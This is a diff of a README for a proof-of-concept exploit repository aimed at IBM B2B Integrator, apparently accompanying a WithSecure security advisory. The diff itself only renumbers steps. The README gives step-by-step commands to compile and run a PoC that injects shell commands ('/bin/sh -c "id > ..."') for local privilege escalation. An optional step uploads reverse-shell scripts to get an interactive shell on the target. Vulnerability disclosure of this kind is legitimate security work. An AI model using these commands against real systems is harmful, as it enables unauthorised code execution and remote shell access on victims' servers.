@@ -12,6 +12,7 @@ https://labs.withsecure.com/advisories/ibm-b2b-integrator
 ## Repo Structure
 
 Most of this code in this repo refers to the LPE command injection attack.
+
 The Python binary client `bin_clien.py` can be used to send messages manually to CLA2, allowing exploitation of the deserialisation RCE vulnerability. 
 
 
@@ -35,17 +36,21 @@ Assuming you have retrieved the relevant files from the JAR decompilation. Will 
 
 1. Decompile `CLA2Client.jar` and `CLA2Server.jar` 
 
-1. In the decompiled code, locate files `CmdLine2Result.java` and `CmdLine2Parms.java` 
+2. In the decompiled code, locate files `CmdLine2Result.java` and `CmdLine2Parms.java` 
 
-1. Copy and paste them into same directory as `Main.java` (`/src/com/sterlingcommerce/woodstock/services/cmdline2/Main.java`) to replicate the directory structure of the original application's java package
+3. Copy and paste them next to `Main.java` to replicate the directory structure of the original application's java package
 
-1. Compile the PoC program - ideally using the JDK packaged by the application 
+```
+/src/com/sterlingcommerce/woodstock/services/cmdline2/
+```
+
+4. Compile the PoC program - ideally using the JDK packaged by the application 
 
 ```bash
 ${B2BHOME}/INSTALL/jdk/bin/javac src/com/sterlingcommerce/woodstock/services/cmdline2/*.java
 ```
 
-1.	Execute it - again, using the JDK packaged by the application if possible
+5.	Execute it - again, using the JDK packaged by the application if possible
 
 ```bash
 ${B2BHOME}/INSTALL/jdk/bin/java -classpath src/ com.sterlingcommerce.woodstock.services.cmdline2.Main '/bin/sh -c "id > /tmp/withsecureresult"' SEND  
@@ -64,7 +69,7 @@ outputNameShort=null
 ******* end of CmdLine2Result *******  
 ```
 
-1.	(Optional) To obtain a fully interactive shell, upload the `revshell.py` and `revshell_listener.py` scripts onto the target system, and start the listener. Then, replace the PoC's command parameter with an invocation of the reverse shell script as below:   
+6.	(Optional) To obtain a fully interactive shell, upload the `revshell.py` and `revshell_listener.py` scripts onto the target system, and start the listener. Then, replace the PoC's command parameter with an invocation of the reverse shell script as below:   
 
 ```bash 
 ${B2BHOME}/INSTALL/jdk/bin/java -classpath src/ com.sterlingcommerce.woodstock.services.cmdline2.Main 'python3 /tmp/revshell.py' SEND
